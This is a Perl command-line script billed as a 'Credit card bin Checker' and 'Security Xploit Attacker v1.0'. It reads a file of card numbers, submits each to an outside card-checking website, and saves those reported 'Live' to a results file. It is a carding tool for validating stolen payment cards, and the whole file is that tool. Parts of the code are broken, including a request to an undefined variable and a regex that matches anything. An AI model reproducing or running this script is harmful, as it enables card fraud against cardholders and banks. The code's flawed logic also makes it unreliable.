#!/usr/bin/perl 
#zone-h poster
#facebook.com/ph.hitachi.org/
use URI::URL;
use LWP::UserAgent;
use Term::ANSIColor;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

my $datetime    = localtime();

system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print color("red");
 system("title Bin Checker");
$logo="
			
";
print $logo;
print color('reset');
print "                    	                  ";
print colored("Credit card bin Checker\n",'white on_red');
print "                      	           ";
print colored("[+]",'green on_blue');
print colored("Security Xploit Attacker v1.0",'red on_cyan');
print colored("[+]\n",'green on_blue');
print "              	                 ";
print colored("[+]",'green on_blue');
print colored ("Start At $datetime",'black on_cyan'),"";
print colored("[+]\n\n",'green on_blue');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
print colored("Enter your bin list :",'cyan');
my $list=<STDIN>;
chomp($list);
  open (CREADITCARD, "<$list") || die "[-] Can't open the bins List, Make Sure Your File is Correct!";
@bins = <CREADITCARD>;
close CREADITCARD;
$link=$#bins + 1;
foreach $bin(@bins){
chomp($bin);

$req = HTTP::Request->new(GET=>$links);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$content = $response->content;
if ($content =~ /1\/2\/3\/4\/5\/6\/7\/8\/9\/0|/){

$creaditcard = $bin;
$checker="http://xuls.to/ccn/"; 
$lwp=LWP::UserAgent->new;
$res =$lwp  -> post($checker,[ 'cc' => $creaditcard, 'submit'  => 'valid',]);
if ($res->content =~ /<b style="color:#008000;">Live<\/b>/) {
print "$creaditcard";print color ('green')," |Live\n";
open (TEXT, '>>Result/LIVE.txt');
print TEXT "\n$bin   =>Live\n";
close (TEXT);
}if ($res->content =~ /<b style="color:#FF0000;">Die<\/b>/) {
print "$creaditcard";print colored (" |Die",'red'),"\n";
}if ($res->content =~ /<b style="color:#800080;">Unknown<\/b>/) {
print "$creaditcard";print colored (" |Unknown",'yellow'),"\n";
}
else {
print "$creaditcard ";
print "=> ";
print colored ("Check the validity of a credit card | ||| [GATE:01] @/ChkNET-ID",'white on_red'),"\n";
}
}
}
